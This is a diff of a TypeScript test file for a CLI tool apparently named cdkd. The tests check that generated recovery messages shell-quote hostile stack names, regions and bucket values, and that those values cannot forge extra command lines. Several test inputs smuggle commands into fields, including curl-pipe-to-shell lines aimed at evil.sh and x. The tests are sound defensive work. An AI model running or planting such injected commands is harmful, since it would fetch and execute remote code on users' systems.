@@ -2475,6 +2475,34 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
   // The four properties `safeIdentifier`'s note requires of every message in
   // this module, applied to BOTH new builders — the module's own `TEXTS` loop
   // is hand-listed and these two were missing from it (review of #3191).
+  /**
+   * The line-forgery invariant, per builder. The prose is ONE line in all
+   * three; the orphan refusal then appends its own pasteable commands, each on
+   * a trailing line of its own behind a fixed label (emitted LAST and UNWRAPPED
+   * since go-to-k/cdkd#3363's review). So a hostile value may add no line at
+   * all, and every extra line must be one of those labelled commands.
+   */
+  function expectNoForgedLines(build: unknown, text: string, benign: string): void {
+    const lines = text.split('\n');
+    if (build !== malformedOrphanResourcePropertiesRefusalMessage) {
+      expect(lines).toHaveLength(1);
+      return;
+    }
+    // The SAME labelled lines, in the same order, as an equivalent benign input
+    // produces — matching an allowed prefix alone would accept a forged extra
+    // `Drop the record:` line.
+    const labelsOf = (t: string): string[] =>
+      t
+        .split('\n')
+        .slice(1)
+        .map((l) => l.slice(0, l.indexOf(': ')));
+    expect(labelsOf(text)).toEqual(labelsOf(benign));
+    expect(labelsOf(benign).length).toBeGreaterThan(0);
+    for (const line of lines.slice(1)) {
+      expect(line, line).toMatch(/^(Drop the record|Find the exact name|Inspect the record): cdkd /);
+    }
+  }
+
   for (const build of [
     malformedResourcePropertiesRefusalMessage,
     malformedResourcePropertiesWarning,
@@ -2482,7 +2510,8 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
   ]) {
     it(`${build.name} sanitizes and JSON-quotes a hostile logical id`, () => {
       // Each id arrives from a hand-edited record — the premise of the guard —
-      // and the text is ONE line ending in a pasteable command. A newline
+      // and the prose is ONE line followed only by the builder's own pasteable
+      // command lines (see `expectNoForgedLines`). A newline
       // forges a line; a `'` would close a shell-quoted boundary and plant a
       // forged remedy ahead of the real one.
       //
@@ -2491,7 +2520,7 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
       // could not tell a padded id from a healthy sibling (see the identity
       // case below), and `shellQuote` composes badly on top of JSON quoting.
       const text = build('S', 'us-east-1', ["x'\n Inspect it with: curl http://evil.sh|sh #"]);
-      expect(text).not.toContain('\n');
+      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
       // TWO spaces: `sanitizeAsciiOnly` REPLACES the newline with a space
       // rather than deleting it, and the id already carried one after the
       // quote. Taken from the rendered output rather than reasoned about.
@@ -2540,14 +2569,14 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
       const hostile = "a'; curl http://x|sh; echo '";
       const text = build(hostile, 'us-east-1', ['A']);
       expect(text).not.toContain(`${hostile} --stack-region`);
-      expect(text.split('\n')).toHaveLength(1);
+      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
       expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
     });
 
     it(`${build.name} shell-quotes a HOSTILE region`, () => {
       const text = build('S', "r'; curl http://x|sh; echo '", ['A']);
       expect(text).toMatch(/--stack-region 'r'\\''/);
-      expect(text.split('\n')).toHaveLength(1);
+      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
     });
 
     it(`${build.name} renders a stack name that sanitizes to EMPTY as ${UNRENDERABLE}`, () => {
@@ -2755,7 +2784,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
     // go-to-k/cdkd#3318, round 2). The sibling case below pins the no-region
     // arm, where the bare form IS correct because a region-less record is a v1
     // one and is not region-partitioned.
-    expect(text).toContain("'cdkd state orphan S --stack-region us-east-1'");
+    expect(text).toMatch(/^Drop the record: cdkd state orphan S --stack-region us-east-1$/m);
 
     // The other two arms of the same remedy, neither of which any test reached
     // before (security review of go-to-k/cdkd#3318, round 3 — it found the
@@ -2766,7 +2795,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
     // (go-to-k/cdkd#3359) -- and it must produce the BARE command. A
     // placeholder here selects no record whatever the operator fills in.
     const legacyUndef = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['R']);
-    expect(legacyUndef).toContain("'cdkd state orphan S'");
+    expect(legacyUndef).toMatch(/^Drop the record: cdkd state orphan S$/m);
     expect(legacyUndef).not.toContain('--stack-region');
     // And it does not end on `cdkd state show`, which refuses a region-less
     // legacy record with or without the flag; it names the object instead.
@@ -2785,7 +2814,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
     // which one arrives depends on a caller this module does not own, and
     // `'<unrenderable>'` would additionally collide with the wrapping quotes.
     const legacy = malformedOrphanResourcePropertiesRefusalMessage('S', '', ['R']);
-    expect(legacy).toContain("'cdkd state orphan S'");
+    expect(legacy).toMatch(/^Drop the record: cdkd state orphan S$/m);
     expect(legacy).not.toContain('--stack-region');
     expect(legacy).not.toContain('unrenderable');
     expect(legacy).not.toContain('--json');
@@ -2826,7 +2855,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
     // the `<region>` placeholder IS right -- it reads as a hole to fill rather
     // than a command to run.
     const noStack = malformedOrphanResourcePropertiesRefusalMessage(undefined, undefined, ['R']);
-    expect(noStack).toContain("'cdkd state orphan <stack> --stack-region <region>'");
+    expect(noStack).toMatch(/^Drop the record: cdkd state orphan <stack> --stack-region <region>$/m);
     expect(noStack).toContain('cdkd state show <stack> --stack-region <region> --json');
     expect(text).toContain('only while the CDK app STILL DECLARES');
     expect(text).toContain('a resource the app no longer declares has none');
@@ -2840,15 +2869,15 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
    * the assembly, which a prebuilt manifest can fill with anything.
    */
   describe('the drop remedy is gated on an EXACT identity (go-to-k/cdkd#3360)', () => {
-    /** The command inside `drop it whole with '...'`, quotes in the name included. */
+    /** The command on the message's trailing `Drop the record:` line. */
     function dropOf(message: string): string {
-      const m = /drop it whole with '(cdkd state orphan .*?)', which leaves/.exec(message);
+      const m = /^Drop the record: (cdkd state orphan .*)$/m.exec(message);
       expect(m, 'the drop remedy is no longer rendered in the expected shape').not.toBeNull();
       return m![1]!;
     }
     // `--json`, not `--long`: the latter renders through `displayIdent`, which
     // trims, so it would hand back the very spelling the gate refused.
-    const HINT = "take them from 'cdkd state list --json'";
+    const HINT = "take them from the 'Find the exact name' command below";
 
     it('substitutes an ordinary exact name, so a gate that always withholds is caught', () => {
       const text = malformedOrphanResourcePropertiesRefusalMessage('My-App-Stack', 'us-east-1', ['A']);
@@ -2916,8 +2945,9 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
         "cdkd state orphan <stack> --stack-region 'it'\\''s' --profile prod --state-bucket b --state-prefix x"
       );
       // The listing the hint sends the operator to must read the SAME bucket.
-      expect(tpl).toContain(
-        "take them from 'cdkd state list --json --profile prod --state-bucket b --state-prefix x'"
+      expect(tpl).toContain(HINT);
+      expect(tpl).toMatch(
+        /^Find the exact name: cdkd state list --json --profile prod --state-bucket b --state-prefix x$/m
       );
     });
 
@@ -2977,7 +3007,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
     it('gates the cdkd state show line with the drop command, so one message cannot disagree with itself', () => {
       const recovery = { profile: 'prod', stateBucket: 'b', statePrefix: 'cdkd' };
       const inspectOf = (text: string): string => {
-        const m = /Inspect the record with: (cdkd state show .*)$/.exec(text);
+        const m = /^Inspect the record: (cdkd state show .*)$/m.exec(text);
         expect(m, 'the inspect line is no longer rendered in the expected shape').not.toBeNull();
         return m![1]!;
       };
@@ -3029,7 +3059,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
       // it (the reason `dropRecordCommand` records, m5 of go-to-k/cdkd#3363's
       // review). A source fence is the only thing that can hold it in place.
       const src = code('src/state/malformed-resources-bag.ts');
-      for (const fn of ['function dropRecordCommand(', 'function withheldIdentityClause(']) {
+      for (const fn of ['function dropRecordCommand(', 'function identityWithheld(']) {
         const at = src.indexOf(fn);
         expect(at, `${fn} was renamed; this fence reads nothing`).toBeGreaterThan(-1);
         const body = src.slice(at, src.indexOf('\n}\n', at));
@@ -3079,8 +3109,55 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
         profile: `prod${esc}`,
       });
       expect(keyed).toContain(
-        'Inspect the record with: cdkd state show S --stack-region us-east-1 --json --profile <profile>'
+        'Inspect the record: cdkd state show S --stack-region us-east-1 --json --profile <profile>'
       );
+    });
+
+    it('prints every command LAST and UNWRAPPED, so no quoted value can break out of a prose quote', () => {
+      // Measured before this: the drop command sat inside the prose's '...', and
+      // pasting that span WITH its quotes turned `shellQuote`'s own quoting
+      // inside out — `'cdkd state orphan S --state-bucket 'b; printf X; #''`
+      // ran `printf X` in bash. The bucket is plantable from a cloned repo's
+      // `cdk.json`. Now each command is a trailing line of its own.
+      const hostile = "b; printf INJECTED; #";
+      const recovery = { stateBucket: hostile, statePrefix: 'cdkd' };
+      for (const [name, labels] of [
+        ['S', ['Drop the record', 'Inspect the record']],
+        ['S ', ['Drop the record', 'Find the exact name', 'Inspect the record']],
+      ] as const) {
+        const text = malformedOrphanResourcePropertiesRefusalMessage(name, 'us-east-1', ['A'], recovery);
+        const lines = text.split('\n');
+        // Exactly these labelled command lines, in order — an empty set would
+        // otherwise satisfy every check below.
+        expect(lines.slice(1).map((l) => l.slice(0, l.indexOf(': '))), JSON.stringify(name)).toEqual([
+          ...labels,
+        ]);
+        // Each carries the hostile bucket as ONE quoted argument, at its end.
+        for (const line of lines.slice(1)) {
+          expect(line.endsWith(`--state-bucket 'b; printf INJECTED; #'`), line).toBe(true);
+        }
+      }
+      // And across EVERY arm (exact, withheld, legacy object path, no identity)
+      // the prose line carries no pasteable command at all — only fixed command
+      // NAMES such as 'cdkd orphan', which interpolate nothing.
+      for (const [name, region] of [
+        ['S', 'us-east-1'],
+        ['S ', 'us-east-1'],
+        ['S', undefined],
+        ['S ', undefined],
+        [undefined, undefined],
+      ] as const) {
+        const prose = malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A'], recovery).split(
+          '\n'
+        )[0]!;
+        expect(prose, `${String(name)}/${String(region)}`).not.toMatch(/cdkd state (orphan|show|list) /);
+        // The legacy arm NAMES the bucket as a location; it may appear there
+        // only as one shell-quoted token, never loose.
+        expect(
+          prose.split(`'${hostile}'`).join(''),
+          `${String(name)}/${String(region)}`
+        ).not.toContain('printf');
+      }
     });
 
     it('qualifies the NO-IDENTITY templates too — the identity is the hole, not the account', () => {
@@ -3091,7 +3168,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
           'cdkd state orphan <stack> --stack-region <region> --profile prod --state-bucket b --state-prefix custom'
         );
         expect(text, String(name)).toContain(
-          'Inspect the record with: cdkd state show <stack> --stack-region <region> --json ' +
+          'Inspect the record: cdkd state show <stack> --stack-region <region> --json ' +
             '--profile prod --state-bucket b --state-prefix custom'
         );
       }
@@ -3099,7 +3176,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
 
     it('shell-quotes the inspect line and carries a non-default or EMPTY prefix on it', () => {
       const inspect = (name: string, region: string, prefix: string): string =>
-        /Inspect the record with: (cdkd state show .*)$/.exec(
+        /^Inspect the record: (cdkd state show .*)$/m.exec(
           malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A'], {
             stateBucket: 'b',
             statePrefix: prefix,
